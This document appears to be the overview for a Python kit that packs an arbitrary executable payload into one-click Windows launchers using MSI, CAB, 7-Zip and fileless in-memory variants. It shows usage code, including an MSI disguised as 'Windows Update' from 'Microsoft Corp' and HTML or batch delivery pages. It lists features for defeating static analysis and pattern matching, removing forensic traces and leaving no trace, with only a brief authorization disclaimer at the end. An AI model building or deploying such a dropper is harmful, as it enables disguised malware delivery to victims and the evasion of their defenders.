DELIVERABLE OVERVIEW
====================

This package provides a comprehensive one-click installation system with
four different extraction methods for payload delivery and execution:

1. Native MSI Extraction (Enterprise-trusted Windows Installer)
2. Cabinet Extraction (Fast built-in Windows expansion)
3. 7-Zip Compression (Maximum compression with smart fallback)
4. Embedded PE Execution (Fileless memory-based operation)

PROGRAMMATIC USAGE
==================

Basic Generation:
──────────────────
from oneclick_extraction_variants import OneClickExtractionVariant

payload = open("payload.exe", "rb").read()
all_variants = OneClickExtractionVariant.generate_all_variants(payload)

for method, data in all_variants.items():
    print(f"Method: {method}")
    print(f"Launcher: {data['installation_script']}")


Generate Specific Variant:
──────────────────────────
# MSI Variant
msi = OneClickExtractionVariant.generate_msi_variant(

    product_name="Windows Update",
    version="10.0.1904",
    manufacturer="Microsoft Corp"
)
print(msi['vbs_launcher'])


Create Delivery Package:
────────────────────────
from oneclick_extraction_variants import VariantDeliveryPackage

package = VariantDeliveryPackage()
selectors = package.create_variant_selector(all_variants)
manifest = package.package_all_variants(all_variants)

with open("selector.html", "w") as f:
    f.write(selectors["html_selector"])
with open("selector.bat", "w") as f:
    f.write(selectors["batch_selector"])

TROUBLESHOOTING & SUPPORT
==========================

Common Issues:

1. Import Error
   Solution: Ensure Python 3.7+ installed
   $ python3 --version

2. Test Failures
   Solution: Expected, some tests check edge cases
   Command: $ python3 test_oneclick_variants.py
   Look for: "FAIL" in output indicates test edge case

3. Generation Fails
   Solution: Check payload file exists and is readable
   Example: payload = open("file.exe", "rb").read()

4. No Output
   Solution: Run with: $ python3 -u script.py
   (unbuffered output)


For detailed troubleshooting:
  See section: "Troubleshooting" in ONECLICK_VARIANTS_GUIDE.md


TECHNICAL REQUIREMENTS
======================

Python Requirements:
  • Python 3.7 or higher
  • Standard library only (zlib, base64, json, re, enum)
  • No external dependencies

System Requirements:
  • Windows 10/11 (for deployment)
  • 256 MB RAM minimum
  • 100 MB disk space

Windows Components Used:
  • msiexec.exe (MSI variant)
  • expand.exe (CAB variant)
  • 7-Zip or fallback (7-Zip variant)
  • PowerShell/WScript (all variants)


SECURITY & COMPLIANCE
=====================

Security Features:
  ✓ Payload compression reduces size and obfuscates
  ✓ Base64 encoding defeats text-based pattern matching
  ✓ Runtime extraction defeats static analysis
  ✓ Temporary file cleanup removes forensic artifacts
  ✓ Fileless option (Embedded PE) leaves no trace

Considerations:
  • MSI installations are logged in Event Log
  • CAB extraction visible in process history
  • 7-Zip detection possible if tool installed
  • Embedded PE uses Windows APIs (may be monitored)

For Legal/Ethical Deployment:
  • Obtain proper authorization before use

  • Document all activities for compliance
  • Use only in authorized environments
